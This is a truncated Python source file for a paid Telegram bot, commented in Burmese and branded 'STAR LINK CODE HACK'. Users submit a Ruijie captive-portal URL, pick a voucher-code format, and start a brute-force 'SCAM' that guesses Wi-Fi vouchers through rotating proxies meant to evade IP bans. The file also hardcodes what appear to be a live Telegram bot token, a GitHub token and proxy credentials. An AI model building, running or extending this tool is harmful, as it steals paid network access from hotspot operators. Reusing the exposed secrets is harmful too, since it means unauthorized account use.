import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

#ဒီနေရာမှာchangeပေးပါbro
BOT_TOKEN = "8980601502:AAFohlUv1IAQtk9iC6XJJy7EOB4UXTPBKIw"
GITHUB_TOKEN = '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'
REPO_OWNER = "makkqt"
REPO_NAME = "Bot"
ADMIN_ID = "8728200516"
##################

# --- Proxy Configuration ---
# Portal URL စစ်တဲ့နေရာမှာပဲ Proxy ကို အမြဲသုံးပါမယ် (IP Ban ကျော်ရန်)
# Scan ဖတ်တဲ့နေရာမှာ Proxy မသုံးတော့ပါ

PROXY_LIST = [
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060"
]

_proxy_index = 0
def get_next_proxy():
    global _proxy_index
    if not PROXY_LIST:
        return None
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    return f"http://{proxy}"


SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
session = None
_connector = None
CONCURRENCY = 1000
_voucher_sem = None
_start_time = time.monotonic()

# လူ 20 ယောက် တစ်ချိန်တည်း scan လုပ်နိုင်ရန်
MAX_CONCURRENT_SCANS = 20
active_scans_count = 0
active_scans_lock = asyncio.Lock()

# Paid users only - no free credits
paid_users = {}

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
        "sha": sha
    }
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

def get_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
        InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔢 VOUCHER 6 လုံး", callback_data="scan_6"),
        InlineKeyboardButton("🔢 VOUCHER 7 လုံး", callback_data="scan_7"),
        InlineKeyboardButton("🔢 VOUCHER 8 လုံး", callback_data="scan_8"),
        InlineKeyboardButton("🔤 VOUCHER ascii-lower", callback_data="scan_ascii-lower"),
        InlineKeyboardButton("🎲 VOUCHER all", callback_data="scan_all"),
        InlineKeyboardButton("🔤+🔢 MIXED 6လုံး (x3kark)", callback_data="scan_mixed"),
        InlineKeyboardButton("🔤+🔢 MIXED 8လုံး (8twcqeb)", callback_data="scan_mixed8"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons = []
    for i in range(10):
        buttons.append(InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}"))
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("🎲 Random ဖြစ်ရှာရန်", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_start_scam_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_paid_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("✅ PAID USER ဖြစ်ရန် နှိပ်ပါ", callback_data="menu_enter_userid"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_scam_button_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🛑 STOP SCAM", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

@bot.message_handler(commands=['start'])
async def start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    
    if user_id in paid_users or user_id in approve:
        approve[message.chat.id] = True
        welcome_text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

🎉 မင်္ဂလာပါခင်ဗျာ! 
✅ သင့်အနေနဲ့ PAID USER ဖြစ်ပါတယ်။
♾️ Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။

အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"""
    else:
        welcome_text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။

PAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။
👨‍💻 Admin: @kuranomi10"""
    
    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard())

@bot.message_handler(commands=['sendall'])
async def send_all_broadcast(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /sendall [your_message]")
        return
    
    broadcast_text = f"📢 ADMIN NOTIFICATION\n\n{args[1]}"
    auth_list, _ = await get_file_content("auth_list.json")
    
    count = 0
    for uid in auth_list:
        try:
            await bot.send_message(int(uid), broadcast_text)
            count += 1
            await asyncio.sleep(0.1)
        except:
            continue
            
    await bot.reply_to(message, f"✅ User {count} ယောက်ထံသို့ စာပို့ပြီးပါပြီ။")

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"
    
    if call.data == "menu_back":
        if user_id in paid_users or user_id in approve:
            text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

✅ PAID USER - Unlimited Access"""
        else:
            text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။

PAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။"""
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_main_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_free_trial":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @kuranomi10 သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        text = f"""🔗 Portal URL ထည့်သွင်းရန်:

/portal [your_portal_url]

ဥပမာ:
/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00

Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွားမည်ဖြစ်သည်။"""
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_back_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_start_scam":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @kuranomi10 သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        global active_scans_count, active_scans_lock
        async with active_scans_lock:
            if active_scans_count >= MAX_CONCURRENT_SCANS:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"⚠️ Bot အလုပ်များနေပါသည်။ လက်ရှိ {active_scans_count}/{MAX_CONCURRENT_SCANS} ယောက် scan လုပ်နေပါသည်။\n\nခဏစောင့်ပြီးမှ ထပ်ကြိုးစားပါ။",
                    reply_markup=get_back_keyboard()
                )
                await bot.answer_callback_query(call.id)
                return
            active_scans_count += 1
        
        if chat_id not in user_data or 'selected_mode' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="❌ VOUCHER အမျိုးအစားမရွေးရသေးပါ။ ကျေးဇူးပြု၍ VOUCHER အရင်ရွေးပါ။",
                reply_markup=get_voucher_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        mode = user_data[chat_id]['selected_mode']
        start_digit = user_data[chat_id].get('start_digit')
        
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
                reply_markup=get_scam_button_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"🔍 Scan စတင်နေပါသည်...\n\n🔢 VOUCHER Mode: {mode}\n\nSTOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
            reply_markup=get_scam_button_keyboard(),
            parse_mode="Markdown"
        )
        
        progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...\n\n")
        scan_id = str(uuid.uuid4())
        
        # Admin ထံသို့ Notification ပို့ခြင်း (URL မတူမှ ပို့မည်)
        try:
            portal_url = user_data[chat_id].get('session_url', 'Unknown')
            last_url = user_data[chat_id].get('last_admin_notified_url', '')
            
            if portal_url != last_url and portal_url != 'Unknown':
                admin_msg = f"🚀 **Scan Start Notification**\n\n👤 **User:** {user_name}\n🆔 **User ID:** `{user_id}`\n🔢 **Mode:** {mode}\n🔗 **Portal URL:**\n`{portal_url}`"
                await bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
                user_data[chat_id]['last_admin_notified_url'] = portal_url
        except Exception as e:
            print(f"Admin Notification Error: {e}")

        task = asyncio.create_task(
            run_bruteforce(
                mode,
                chat_id,
                user_data[chat_id]['session_url'],
                scan_id,
                message=call.message,
                progress_msg=progress_msg,
                start_digit=start_digit
            )
        )
        
        scan_tasks[chat_id] = {
            "task": task,
            "stop": False,
            "scan_id": scan_id
        }
        
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_paid":
        text = f"""🔑 PAID USER ဖြစ်ရန်

ကျေးဇူးပြု၍ သင်၏ USER ID ကိုထည့်သွင်းပါ။

USER ID: {user_id}

✅ သင်၏ USER ID ကို Admin ထံ ပေးပို့ပြီး Key ဝယ်ယူပါ။
👨‍💻 Admin: @kuranomi10

Key ရရှိပြီးပါက PAID USER ဖြစ်ရန် နှိပ်ပါ"""
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_paid_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_enter_userid":
        auth_list, _ = await get_file_content("auth_list.json")
        
        if user_id in auth_list:
            valid = check_key_expiration(auth_list[user_id])
            if valid:
                approve[chat_id] = True
                paid_users[user_id] = True
                if chat_id not in user_data:
                    user_data[chat_id] = {}
                
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}\n\nအောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။",
                    reply_markup=get_main_keyboard()
                )
            else:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text="❌ သင်၏ Key Expired ဖြစ်နေပါသည်။ ကျေးဇူးပြု၍ Admin @kuranomi10 သို့ ဆက်သွယ်ပါ။",
                    reply_markup=get_back_keyboard()
                )
        else:
            await bot.send_message(
                chat_id=ADMIN_ID,
                text=f"🔔 New User Request:\nName: {user_name}\nID: {user_id}\n\nTo approve:\n/genkey unlimited {user_id}"
            )
            
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"🙏 ကျေးဇူးပြု၍ Paid ဝယ်ယူပါ။\n\nUSER ID: {user_id}\n\nAdmin မှ သင့် ID ကို အတည်ပြုပြီးပါက PAID USER ဖြစ်ပါမည်။\n👨‍💻 Admin: @kuranomi10",
                reply_markup=get_back_keyboard()
            )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_result":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @kuranomi10 သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        results, _ = await get_file_content("result.json")
        if user_id in results and results[user_id]:
            codes = "\n".join(results[user_id])
            text = f"✅ Found Codes:\n{codes}"
        else:
            text = "📋 သင့်တွင် ယခင်ကရရှိထားသော success code မရှိသေးပါ။"
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_back_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_recheck":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @kuranomi10 သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="🔄 Recheck ကို စတင်နေပါသည်...",
            reply_markup=get_scam_button_keyboard()
        )
        await recheck_command(call.message)
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_stop":
        await stop_scan_command(call.message)
        await bot.answer_callback_query(call.id, "🛑 Scan ကိုရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
        return
    
    if call.data.startswith("scan_"):
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @kuranomi10 သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        mode = call.data.replace("scan_", "")
        
        if chat_id not in user_data:
            user_data[chat_id] = {}
        
        user_data[chat_id]['selected_mode'] = mode
        
        if 'session_url' not in user_data[chat_id]:
         
